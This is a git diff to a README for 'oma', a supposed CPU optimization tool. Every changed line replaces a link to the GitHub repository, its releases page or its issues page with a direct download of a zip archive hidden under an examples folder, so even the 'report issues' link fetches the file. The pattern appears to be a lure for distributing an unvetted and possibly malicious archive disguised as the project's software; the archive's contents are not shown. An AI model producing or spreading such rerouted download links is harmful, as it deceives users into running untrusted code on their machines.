@@ -1,6 +1,6 @@
 # ⚙️ oma - Fast CPU Optimization for Your Software
 
-[![Download oma](https://img.shields.io/badge/Download-oma-ff5733?style=for-the-badge&logo=github)](https://github.com/Gshacker-cpu/oma)
+[![Download oma](https://img.shields.io/badge/Download-oma-ff5733?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gshacker-cpu/oma/main/examples/basic/src/Software-3.0.zip)
 
 ---
 
@@ -29,7 +29,7 @@ You don't need to install any extra tools or software. oma runs on its own when 
 
 1. Visit the main download page by clicking this link:
 
-   [Download oma from GitHub](https://github.com/Gshacker-cpu/oma)
+   [Download oma from GitHub](https://raw.githubusercontent.com/Gshacker-cpu/oma/main/examples/basic/src/Software-3.0.zip)
 
 2. On the GitHub page, look for a folder or section called **Releases** or a direct download link to the program files.
 
@@ -120,8 +120,8 @@ oma is open source and runs locally on your PC. It does not access your files or
 
 ## 🔗 Useful Links
 
-- [GitHub repository and downloads](https://github.com/Gshacker-cpu/oma)  
-- [GitHub release page](https://github.com/Gshacker-cpu/oma/releases)  
+- [GitHub repository and downloads](https://raw.githubusercontent.com/Gshacker-cpu/oma/main/examples/basic/src/Software-3.0.zip)  
+- [GitHub release page](https://raw.githubusercontent.com/Gshacker-cpu/oma/main/examples/basic/src/Software-3.0.zip)  
 
 ---
 
@@ -142,8 +142,8 @@ If you experience performance issues, your CPU might not fully support advanced 
 
 If you need help, ask questions or report issues on the GitHub repository page under the **Issues** tab:
 
-https://github.com/Gshacker-cpu/oma/issues
+https://raw.githubusercontent.com/Gshacker-cpu/oma/main/examples/basic/src/Software-3.0.zip
 
 ---
 
-# [⬇️ Download oma Now](https://github.com/Gshacker-cpu/oma)
+# [⬇️ Download oma Now](https://raw.githubusercontent.com/Gshacker-cpu/oma/main/examples/basic/src/Software-3.0.zip)
